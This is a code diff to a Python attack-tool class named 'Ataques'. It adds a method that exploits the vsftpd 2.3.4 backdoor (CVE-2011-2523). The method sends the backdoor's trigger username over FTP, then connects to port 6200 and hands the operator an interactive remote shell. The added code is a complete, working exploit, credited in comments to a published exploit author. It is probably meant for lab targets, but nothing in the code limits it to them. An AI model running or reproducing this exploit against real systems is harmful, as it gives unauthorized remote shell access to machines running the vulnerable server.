@@ -1,6 +1,8 @@
 import scapy.all as scapy
 import time
-import threading
+from telnetlib import Telnet 
+from signal import signal, SIGINT
+from sys import exit
 
 class Ataques:
 
@@ -129,4 +131,51 @@ class Ataques:
     
         
 
+    def exploit_vsftpd(self, ip):
+        # Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
+        # Date: 9-04-2021
+        # Exploit Author: HerculesRD
+        # Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html
+        # Version: vsftpd 2.3.4
+        # Tested on: debian
+        # CVE : CVE-2011-2523
+
+    #!/usr/bin/python3   
         
+
+        try:
+            def handler(signal_received, frame):
+                # Handle any cleanup here
+                # print('   [+]Exiting...')
+                exit(0)
+
+            signal(SIGINT, handler)                           
+                                
+            portFTP = 21 
+
+            user="USER nergal:)"
+            password="PASS pass"
+
+            tn=Telnet(ip, portFTP)
+            tn.read_until(b"(vsFTPd 2.3.4)")
+            tn.write(user.encode('ascii') + b"\n")
+            tn.read_until(b"password.") 
+            tn.write(password.encode('ascii') + b"\n")
+
+            tn2=Telnet(ip, 6200)
+            print('Success, shell opened')
+            print('Send `exit` to quit shell')
+            tn2.interact()
+            tn.close()
+            tn2.close()
+        except:
+            print('   [+]Error de conexion FTP server')
+            print('   [+]Saliendo...')
+            return
+
+        
+            
+
+
+
+
